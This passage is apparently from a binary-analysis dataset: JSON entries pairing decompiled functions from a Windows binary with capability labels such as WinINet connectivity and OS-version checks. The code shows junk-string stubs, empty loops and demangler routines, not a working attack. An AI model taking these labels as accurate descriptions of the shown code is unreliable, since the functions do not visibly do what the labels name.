            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint fcn.0042ba94(void)\n\n{\n    char cVar1;\n    uint var_fch;\n    uint var_f0h;\n    uint var_d8h;\n    uint var_beh;\n    uint var_a1h;\n    uint var_85h;\n    uint var_69h;\n    uint var_4dh;\n    uint var_31h;\n    int32_t var_15h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"tfwacluebrthnirmd\", &var_beh);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ifhwugolwxlpuvqdhyjdwjxfzmayznnyecuqtapzzjburxslqsys\", &var_beh + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ifhwugolwxlpuvqdhyjdwjxfzmayznnyecuqtapzzjburxslqsys\", &var_a1h);\n    fcn.00483110();\n    fcn.004b21e0(\"ifhwugolwxlpuvqdhyjdwjxfzmayznnyecuqtapzzjburxslqsys\", &var_85h);\n    cVar1 = fcn.004c1070(&var_a1h + 1, &var_beh + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x33; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ifhwugolwxlpuvqdhyjdwjxfzmayznnyecuqtapzzjburxslqsys\", &var_69h);\n    fcn.00483110();\n    fcn.004b21e0(\"ifhwugolwxlpuvqdhyjdwjxfzmayznnyecuqtapzzjburxslqsys\", &var_4dh);\n    cVar1 = fcn.004c09a0(&var_69h + 1, &var_85h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x26; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"tfwacluebrthnirmd\", &var_31h);\n    fcn.00483110();\n    fcn.004b21e0(\"tfwacluebrthnirmd\", &var_15h);\n    cVar1 = fcn.004c09a0(&var_31h + 1, &var_4dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffe8 = 0x21; 0 < stack0xffffffe8; unique0x00007a80 = stack0xffffffe8 + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 880
    },
    "0042be80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0042be80(uint noname_0, uint arg_ch, uint arg_10h, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    char cVar1;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_dch;\n    uint var_c4h;\n    uint var_aah;\n    uint var_8dh;\n    uint var_71h;\n    uint var_55h;\n    uchar var_3ah;\n    uint var_39h;\n    uint var_2ch;\n    ulong uStack44;\n    ulong uStack36;\n    uint var_18h;\n    int32_t var_11h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_11h._0_1_ = 1;\n    var_18h = 0x172;\n    uStack36 = *0x523580;\n    fcn.00483110();\n    fcn.004b21e0(\"ufkdzherzdiclcmoqjyhnnieakwokklfflapitoxizpodtddolpxjdotdkdruqtsswutowwszgz\", &var_aah);\n    fcn.00483140();\n    uStack44 = *0x523588;\n    var_2ch = 0x89e;\n    fcn.00483110();\n    fcn.004b21e0(0x5219c0, &var_aah + 1);\n    fcn.00483140();\n    stack0xffffffc4 = *0x523590;\n    var_39h._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(0x5219c0, &var_8dh);\n    fcn.00483110();\n    fcn.004b21e0(0x5219c0, &var_71h);\n    cVar1 = fcn.004c1070(&var_8dh + 1, &var_aah + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 6; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ufkdzherzdiclcmoqjyhnnieakwokklfflapitoxizpodtddolpxjdotdkdruqtsswutowwszgz\", &var_55h);\n    fcn.00483110();\n    fcn.004b21e0(\"ufkdzherzdiclcmoqjyhnnieakwokklfflapitoxizpodtddolpxjdotdkdruqtsswutowwszgz\", &var_3ah);\n    cVar1 = fcn.004c09a0(&var_55h + 1, &var_71h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffec = 0x59; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 885
    },
    "0042c18c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid fcn.0042c18c(void)\n\n{\n    char cVar1;\n    uint var_12ch;\n    uint var_128h;\n    uint var_110h;\n    uint var_f8h;\n    uint var_e0h;\n    uint var_c8h;\n    uchar var_c4h [27];\n    uint var_a9h;\n    uint var_8dh;\n    uint var_71h;\n    uint var_55h;\n    uint var_39h;\n    uchar var_1fh;\n    uchar var_1eh;\n    uchar var_1dh;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_1ch = 0x6be;\n    var_1dh = 0;\n    var_1eh = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"pcain\", &var_c8h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"gypxqrywxyrxlxkvlaeppucjoipbedyredpexgpimov\", &var_c8h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ckrdlowuceavgpmnhhlhxiagnf\", &var_c8h + 2);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"kkxitvguapkegzndaebslluxnqancrykpevanvlkgmeztzqtqctiswlyfzxtw\", &var_c8h + 3);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"gypxqrywxyrxlxkvlaeppucjoipbedyredpexgpimov\", &var_a9h);\n    fcn.00483110();\n    fcn.004b21e0(\"gypxqrywxyrxlxkvlaeppucjoipbedyredpexgpimov\", &var_8dh);\n    cVar1 = fcn.004c1070(&var_a9h + 1, var_c4h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x40; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"gypxqrywxyrxlxkvlaeppucjoipbedyredpexgpimov\", &var_71h);\n    fcn.00483110();\n    fcn.004b21e0(\"gypxqrywxyrxlxkvlaeppucjoipbedyredpexgpimov\", &var_55h);\n    cVar1 = fcn.004c1070(&var_71h + 1, &var_8dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x5b; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ckrdlowuceavgpmnhhlhxiagnf\", &var_39h);\n    fcn.00483110();\n    fcn.004b21e0(\"ckrdlowuceavgpmnhhlhxiagnf\", &var_1fh);\n    cVar1 = fcn.004c1070(&var_39h + 1, &var_55h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_14h = 0x33; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    for (var_18h = 0x62; 0 < var_18h; var_18h = var_18h + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 1109
    },
    "0042d432": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d432(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if ((arg_8h == 1) && (arg_ch == 0xffff)) {\n        fcn.004b9aa0();\n        fcn.004014c0(fcn.0042d420);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0042dba0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042dba0(uint param_1, int32_t param_2)\n\n{\n    char *pcVar1;\n    int32_t in_EAX;\n    \n    if (param_2 == 0) {\n        pcVar1 = *(in_EAX + 0xc);\n        if (*pcVar1 == '\\0') {\n            return 0;\n        }\n        *(in_EAX + 0xc) = pcVar1 + 1;\n        param_2 = *pcVar1;\n    }\n    if (param_2 == 0x68) {\n        fcn.0042d650();\n    }\n    else {\n        if (param_2 != 0x76) {\n            return 0;\n        }\n        fcn.0042d650();\n        if (**(in_EAX + 0xc) != '_') {\n            return 0;\n        }\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n        fcn.0042d650();\n    }\n    if (**(in_EAX + 0xc) != '_') {\n        return 0;\n    }\n    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n    return 1;\n}\n",
        "token_count": 280
    },
    "0042dc10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0042dc10(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    \n    cVar1 = *in_EAX;\n    if ((cVar1 != 'r' && cVar1 != 'V') && (cVar1 != 'K')) {\n        if (cVar1 != 'D') {\n            return false;\n        }\n        return in_EAX[1] + 0x89U < 2 || (in_EAX[1] & 0xdfU) == 0x4f;\n    }\n    return true;\n}\n",
        "token_count": 126
    },
    "0042dff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint * fcn.0042dff0(void)\n\n{\n    uint8_t **ppuVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint8_t **ppuVar5;\n    uint8_t uVar6;\n    int32_t in_EAX;\n    uint *puVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    int32_t iVar11;\n    uint8_t *puVar12;\n    char *pcVar13;\n    char *pcVar14;\n    uint8_t *puVar15;\n    uint8_t *puVar16;\n    bool bVar17;\n    uchar uVar18;\n    bool bVar19;\n    bool bVar20;\n    uchar uVar21;\n    \n    pcVar14 = *(in_EAX + 0xc);\n    cVar2 = *pcVar14;\n    if (cVar2 == 'L') {\n        pcVar14 = *(in_EAX + 0xc);\n        if (*pcVar14 != 'L') {\n            return NULL;\n        }\n        pcVar13 = pcVar14 + 1;\n        *(in_EAX + 0xc) = pcVar13;\n        cVar2 = pcVar14[1];\n        if ((cVar2 == '_') || (cVar2 == 'Z')) {\n            if (cVar2 == '_') {\n                pcVar13 = pcVar14 + 2;\n                *(in_EAX + 0xc) = pcVar13;\n                cVar2 = pcVar14[2];\n                if (cVar2 != 'Z') {\n                    puVar7 = NULL;\n                    goto joined_r0x0042df8d;\n                }\n            }\n            *(in_EAX + 0xc) = pcVar13 + 1;\n            puVar7 = fcn.0042ffd0();\n            pcVar13 = *(in_EAX + 0xc);\n            cVar2 = *pcVar13;\n            goto joined_r0x0042df8d;\n        }\n        piVar8 = fcn.0042ed40();\n        if (piVar8 == NULL) {\n            return 0;\n        }\n        if ((*piVar8 == 0x27) && (*(piVar8[2] + 0x10) != 0)) {\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) - *(piVar8[2] + 4);\n        }\n        pcVar13 = *(in_EAX + 0xc);\n        cVar2 = *pcVar13;\n        pcVar14 = pcVar13;\n        if (cVar2 == 'n') {\n            pcVar14 = pcVar13 + 1;\n            *(in_EAX + 0xc) = pcVar14;\n            cVar2 = pcVar13[1];\n        }\n        pcVar13 = pcVar14;\n        if (cVar2 == 'E') {\n            iVar11 = 0;\n        }\n        else {\n            do {\n                if (cVar2 == '\\0') {\n                    return 0;\n                }\n                pcVar13 = pcVar13 + 1;\n                *(in_EAX + 0xc) = pcVar13;\n                cVar2 = *pcVar13;\n            } while (cVar2 != 'E');\n            iVar11 = pcVar13 - pcVar14;\n        }\n        iVar4 = *(in_EAX + 0x14);\n        if (iVar4 < *(in_EAX + 0x18)) {\n            puVar7 = iVar4 * 0x10 + *(in_EAX + 0x10);\n            puVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar4 + 1;\n            if ((pcVar14 == NULL) || (iVar11 == 0)) goto code_r0x0042dfe0;\n            puVar7[1] = 0;\n            *puVar7 = 0;\n            puVar7[2] = pcVar14;\n            puVar7[3] = iVar11;\n        }\n        else {\ncode_r0x0042dfe0:\n            puVar7 = NULL;\n        }\n        puVar7 = fcn.0042d480(puVar7);\n        pcVar13 = *(in_EAX + 0xc);\n        cVar2 = *pcVar13;\njoined_r0x0042df8d:\n        if (cVar2 != 'E') {\n            return NULL;\n        }\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        return puVar7;\n    }\n    if (cVar2 == 'T') {\n        if (**(in_EAX + 0xc) != 'T') {\n            return NULL;\n        }\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n        iVar11 = fcn.0042d750();\n        if ((-1 < iVar11) && (iVar4 = *(in_EAX + 0x14),  iVar4 < *(in_EAX + 0x18))) {\n            puVar7 = *(in_EAX + 0x10) + iVar4 * 0x10;\n            puVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar4 + 1;\n            *puVar7 = 5;\n            puVar7[2] = iVar11;\n            return puVar7;\n        }\n        return NULL;\n    }\n    if (cVar2 == 's') {\n        if (pcVar14[1] == 'r') {\n            *(in_EAX + 0xc) = pcVar14 + 2;\n            fcn.0042ed40();\n            uVar10 = fcn.0042fbd0();\n            if (**(in_EAX + 0xc) == 'I') {\n                *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n                uVar10 = fcn.0042e720();\n                uVar10 = fcn.0042d480(uVar10);\n            }\n            puVar7 = fcn.0042d480(uVar10);\n            return puVar7;\n        }\n        if (pcVar14[1] == 'p') {\n            *(in_EAX + 0xc) = pcVar14 + 2;\n            fcn.0042dff0();\n            puVar7 = fcn.0042d480(0);\n            return puVar7;\n        }\n    }\n    else if (cVar2 == 'f') {\n        if (pcVar14[1] == 'p') {\n            *(in_EAX + 0xc) = pcVar14 + 2;\n            if (pcVar14[2] == 'T') {\n                iVar11 = 0;\n                *(in_EAX + 0xc) = pcVar14 + 3;\n            }\n            else {\n                uVar9 = fcn.0042d750();\n                iVar11 = uVar9 + 1;\n                if ((uVar9 & 0x7fffffff) == 0x7fffffff) {\n                    return 0;\n                }\n            }\n            iVar4 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar4) {\n                return 0;\n            }\n            puVar7 = iVar4 * 0x10 + *(in_EAX + 0x10);\n            puVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar4 + 1;\n            *puVar7 = 6;\n            puVar7[2] = iVar11;\n            return puVar7;\n        }\n    }\n    else {\n        if (cVar2 - 0x30U < 10) {\ncode_r0x0042e02a:\n            puVar7 = fcn.0042fbd0();\n            if (puVar7 == NULL) {\n                return 0;\n            }\n            if (**(in_EAX + 0xc) != 'I') {\n                return puVar7;\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n            uVar10 = fcn.0042e720();\n            puVar7 = fcn.0042d480(uVar10);\n            return puVar7;\n        }\n        if (cVar2 == 'o') {\n            if (pcVar14[1] == 'n') {\n                *(in_EAX + 0xc) = pcVar14 + 2;\n                goto code_r0x0042e02a;\n            }\n        }\n        else if (((cVar2 == 'i') || (cVar2 == 't')) && (pcVar14[1] == 'l')) {\n            if (cVar2 == 't') {\n                fcn.0042ed40();\n                pcVar14 = *(in_EAX + 0xc);\n                if (pcVar14[1] == '\\0') {\n                    return 0;\n                }\n            }\n            *(in_EAX + 0xc) = pcVar14 + 2;\n            uVar10 = fcn.0042e670();\n            puVar7 = fcn.0042d480(uVar10);\n            return puVar7;\n        }\n    }\n    piVar8 = fcn.0042f640();\n    if (piVar8 == NULL) {\n        return 0;\n    }\n    iVar11 = *piVar8;\n    if (iVar11 == 0x31) {\n        ppuVar5 = piVar8[2];\n        iVar11 = 3;\n        puVar15 = *ppuVar5;\n        ppuVar1 = in_EAX + 0x2c;\n        bVar17 = CARRY4(*ppuVar1, ppuVar5[2] + -2);\n        *ppuVar1 = *ppuVar1 + ppuVar5[2] + -2;\n        bVar20 = *ppuVar1 == NULL;\n        puVar12 = puVar15;\n        puVar16 = 0x524eb0;\n        do {\n            if (iVar11 == 0) break;\n            iVar11 = iVar11 + -1;\n            bVar17 = *puVar12 < *puVar16;\n            bVar20 = *puVar12 == *puVar16;\n            puVar12 = puVar12 + 1;\n            puVar16 = puVar16 + 1;\n        } while (bVar20);\n        if ((!bVar17 && !bVar20) == bVar17) {\n            uVar10 = fcn.0042ed40();\n            goto code_r0x0042e3f5;\n        }\n        puVar12 = ppuVar5[3];\n        if (puVar12 != 0x1) {\n            if (puVar12 < 2) goto joined_r0x0042e442;\n            if (puVar12 != 0x2) {\n                if (puVar12 != 0x3) {\n                    return 0;\n                }\n                bVar17 = false;\n                bVar20 = puVar15 == NULL;\n                if (bVar20) {\n                    return 0;\n                }\n                iVar11 = 3;\n                puVar12 = puVar15;\n                puVar16 = 0x524ebf;\n                do {\n                    if (iVar11 == 0) break;\n                    iVar11 = iVar11 + -1;\n                    bVar17 = *puVar12 < *puVar16;\n                    bVar20 = *puVar12 == *puVar16;\n                    puVar12 = puVar12 + 1;\n                    puVar16 = puVar16 + 1;\n                } while (bVar20);\n                if ((!bVar17 && !bVar20) == bVar17) {\n                    fcn.0042dff0();\n                }\n                else {\n                    if (*puVar15 != 0x66) {\n                        if (*puVar15 != 0x6e) {\n                            return 0;\n                        }\n                        if ((puVar15[1] != 0x77) && (puVar15[1] != 0x61)) {\n                            return 0;\n                        }\n                        fcn.0042e670();\n                        fcn.0042ed40();\n                        pcVar14 = *(in_EAX + 0xc);\n                        cVar2 = *pcVar14;\n                        if (cVar2 == 'E') {\n                            *(in_EAX + 0xc) = pcVar14 + 1;\n                            iVar11 = 0;\n                        }\n                        else if (cVar2 == 'p') {\n                            if (pcVar14[1] != 'i') {\n                                return 0;\n                            }\n                            *(in_EAX + 0xc) = pcVar14 + 2;\n                            iVar11 = fcn.0042e670();\n                        }\n                        else {\n                            if (cVar2 != 'i') {\n                                return 0;\n                            }\n                            if (pcVar14[1] != 'l') {\n                                return 0;\n                            }\n                            iVar11 = fcn.0042dff0();\n                        }\n                        goto code_r0x0042e2a9;\n                    }\n                    fcn.0042f640();\n                }\n                fcn.0042dff0();\n                iVar11 = fcn.0042dff0();\n                if (iVar11 == 0) {\n                    return NULL;\n                }\ncode_r0x0042e2a9:\n                uVar10 = fcn.0042d480(iVar11);\n                uVar10 = fcn.0042d480(uVar10);\n                puVar7 = fcn.0042d480(uVar10);\n                return puVar7;\n            }\n            if (puVar15 == NULL) {\n                return 0;\n            }\n            if ((*ppuVar5)[1] == 99) {\n                uVar3 = **ppuVar5;\n                uVar6 = uVar3 + 0x9d;\n                if ((1 < uVar6) && (uVar6 = uVar3 + 0x8e,  1 < uVar6)) goto code_r0x0042e4d8;\n                uVar21 = uVar6 == 1;\n                uVar18 = uVar6 == 0;\n                fcn.0042ed40();\n            }\n            else {\ncode_r0x0042e4d8:\n                uVar18 = *puVar15 < 0x66;\n                uVar21 = *puVar15 == 0x66;\n                if (uVar21) {\n                    fcn.0042f640();\n                }\n                else {\n                    fcn.0042dff0();\n                }\n            }\n            iVar11 = 3;\n            puVar12 = puVar15;\n            puVar16 = 0x524eb6;\n            do {\n                if (iVar11 == 0) break;\n                iVar11 = iVar11 + -1;\n                uVar18 = *puVar12 < *puVar16;\n                uVar21 = *puVar12 == *puVar16;\n                puVar12 = puVar12 + 1;\n                puVar16 = puVar16 + 1;\n            } while (uVar21);\n            bVar17 = false;\n            bVar20 = (!uVar18 && !uVar21) == uVar18;\n            if (bVar20) {\n                uVar10 = fcn.0042e670();\n            }\n            else {\n                iVar11 = 3;\n                puVar12 = puVar15;\n                puVar16 = 0x524eb9;\n                do {\n                    if (iVar11 == 0) break;\n                    iVar11 = iVar11 + -1;\n                    bVar17 = *puVar12 < *puVar16;\n                    bVar20 = *puVar12 == *puVar16;\n                    puVar12 = puVar12 + 1;\n                    puVar16 = puVar16 + 1;\n                } while (bVar20);\n                bVar19 = false;\n                bVar17 = (!bVar17 && !bVar20) == bVar17;\n                if (!bVar17) {\n                    iVar11 = 3;\n                    puVar12 = 0x524ebc;\n                    do {\n                        if (iVar11 == 0) break;\n                        iVar11 = iVar11 + -1;\n                        bVar19 = *puVar15 < *puVar12;\n                        bVar17 = *puVar15 == *puVar12;\n                        puVar15 = puVar15 + 1;\n                        puVar12 = puVar12 + 1;\n                    } while (bVar17);\n                    if ((!bVar19 && !bVar17) != bVar19) {\n                        uVar10 = fcn.0042dff0();\n                        goto code_r0x0042e558;\n                    }\n                }\n                uVar10 = fcn.0042fbd0();\n                if (**(in_EAX + 0xc) == 'I') {\n                    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n                    uVar10 = fcn.0042e720();\n                    uVar10 = fcn.0042d480(uVar10);\n                }\n            }\ncode_r0x0042e558:\n            uVar10 = fcn.0042d480(uVar10);\n            puVar7 = fcn.0042d480(uVar10);\n            return puVar7;\n        }\n        uVar6 = *puVar15;\n        if (((uVar6 == 0x70) || (uVar6 == 0x6d)) && (uVar6 == puVar15[1])) {\n            puVar16 = *(in_EAX + 0xc);\n            bVar17 = *puVar16 < 0x5f;\n            bVar20 = *puVar16 == 0x5f;\n            if (bVar20) {\n                *(in_EAX + 0xc) = puVar16 + 1;\n                goto code_r0x0042e3b2;\n            }\n        }\n        else {\ncode_r0x0042e3b2:\n            bVar17 = false;\n            puVar12 = NULL;\n            bVar20 = true;\n        }\n        iVar11 = 3;\n        puVar16 = 0x524eb3;\n        do {\n            if (iVar11 == 0) break;\n            iVar11 = iVar11 + -1;\n            bVar17 = *puVar15 < *puVar16;\n            bVar20 = *puVar15 == *puVar16;\n            puVar15 = puVar15 + 1;\n            puVar16 = puVar16 + 1;\n        } while (bVar20);\n        if ((!bVar17 && !bVar20) != bVar17) goto code_r0x0042e3d1;\n        uVar10 = fcn.0042e720();\n    }\n    else {\n        if (iVar11 == 0x32) {\n            puVar12 = piVar8[2];\n            if (puVar12 != 0x1) {\n                if (1 < puVar12) {\n                    return 0;\n                }\njoined_r0x0042e442:\n                if (puVar12 == NULL) {\n                    puVar7 = fcn.0042d480(0);\n                    return puVar7;\n                }\n                return 0;\n            }\n            uVar10 = fcn.0042dff0();\n            goto code_r0x0042e3f5;\n        }\n        if (iVar11 != 0x33) {\n            return 0;\n        }\n        if (**(in_EAX + 0xc) == '_') {\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n            uVar10 = fcn.0042e670();\n            goto code_r0x0042e3f5;\n        }\n        puVar12 = NULL;\ncode_r0x0042e3d1:\n        uVar10 = fcn.0042dff0();\n    }\n    if (puVar12 != NULL) {\n        uVar10 = fcn.0042d480(uVar10);\n    }\ncode_r0x0042e3f5:\n    puVar7 = fcn.0042d480(uVar10);\n    return puVar7;\n}\n",
        "token_count": 4500
    },
    "0042e720": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0042e720(void)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t *piVar6;\n    int32_t aiStack32 [4];\n    \n    pcVar5 = *(in_EAX + 0xc);\n    uVar4 = *(in_EAX + 0x28);\n    cVar2 = *pcVar5;\n    if (cVar2 == 'E') {\n        *(in_EAX + 0xc) = pcVar5 + 1;\n        uVar4 = fcn.0042d480(0);\n        return uVar4;\n    }\n    aiStack32[0] = 0;\n    piVar6 = aiStack32;\n    do {\n        if (cVar2 == 'L') {\n            iVar3 = fcn.0042de70();\n        }\n        else if (cVar2 < 'M') {\n            if (1 < cVar2 + 0xb7U) goto code_r0x0042e7d0;\n            iVar3 = fcn.0042e830();\n        }\n        else if (cVar2 == 'X') {\n            uVar1 = *(in_EAX + 0x30);\n            *(in_EAX + 0x30) = 1;\n            *(in_EAX + 0xc) = pcVar5 + 1;\n            iVar3 = fcn.0042dff0();\n            *(in_EAX + 0x30) = uVar1;\n            if (**(in_EAX + 0xc) != 'E') {\n                return 0;\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n        }\n        else {\ncode_r0x0042e7d0:\n            iVar3 = fcn.0042ed40();\n        }\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar3 = fcn.0042d480(0);\n        *piVar6 = iVar3;\n        if (iVar3 == 0) {\n            return 0;\n        }\n        pcVar5 = *(in_EAX + 0xc);\n        piVar6 = iVar3 + 0xc;\n        cVar2 = *pcVar5;\n        if (cVar2 == 'E') {\n            *(in_EAX + 0x28) = uVar4;\n            *(in_EAX + 0xc) = pcVar5 + 1;\n            return aiStack32[0];\n        }\n    } while( true );\n}\n",
        "token_count": 587
    },
    "0042ed40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * fcn.0042ed40(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t in_EAX;\n    int32_t iVar5;\n    int32_t **ppiVar6;\n    int32_t *piVar7;\n    uint uVar8;\n    uint uVar9;\n    char cVar10;\n    char *pcVar11;\n    uint *puVar12;\n    char *pcVar13;\n    char *pcVar14;\n    int32_t *piStack32;\n    \n    pcVar13 = *(in_EAX + 0xc);\n    iVar5 = fcn.0042dc10();\n    if (iVar5 != 0) {\n        ppiVar6 = fcn.0042f8d0();\n        if (ppiVar6 == NULL) {\n            return NULL;\n        }\n        if (**(in_EAX + 0xc) == 'F') {\n            piVar7 = fcn.0042fb60();\n            *ppiVar6 = piVar7;\n        }\n        else {\n            piVar7 = fcn.0042ed40();\n            *ppiVar6 = piVar7;\n        }\n        if (piVar7 == NULL) {\n            return NULL;\n        }\n        if (*piVar7 - 0x1fU < 2) {\n            piVar1 = piVar7[2];\n            piVar7[2] = piStack32;\n            piStack32 = *ppiVar6;\n            *ppiVar6 = piVar1;\n        }\n        if (piStack32 == NULL) {\n            return NULL;\n        }\n        iVar5 = *(in_EAX + 0x20);\n        if (*(in_EAX + 0x24) <= iVar5) {\n            return NULL;\n        }\n        *(*(in_EAX + 0x1c) + iVar5 * 4) = piStack32;\n        *(in_EAX + 0x20) = iVar5 + 1;\n        return piStack32;\n    }\n    // switch table (75 cases) at 0x524eec\n    switch(*pcVar13 - 0x30U & 0xff) {\n    case 0:\n    case 1:\n    case 2:\n    case 3:\n    case 4:\n    case 5:\n    case 6:\n    case 7:\n    case 8:\n    case 9:\n    case 0x1e:\n    case 0x2a:\n        piStack32 = fcn.0042e860();\n        break;\n    default:\n        goto code_r0x0042edb3;\n    case 0x11:\n        pcVar14 = pcVar13 + 1;\n        *(in_EAX + 0xc) = pcVar14;\n        if (pcVar13[1] != '_') {\n            pcVar11 = pcVar14;\n            if (pcVar13[1] - 0x30U < 10) {\n                do {\n                    pcVar13 = pcVar11;\n                    pcVar11 = pcVar13 + 1;\n                    *(in_EAX + 0xc) = pcVar11;\n                } while 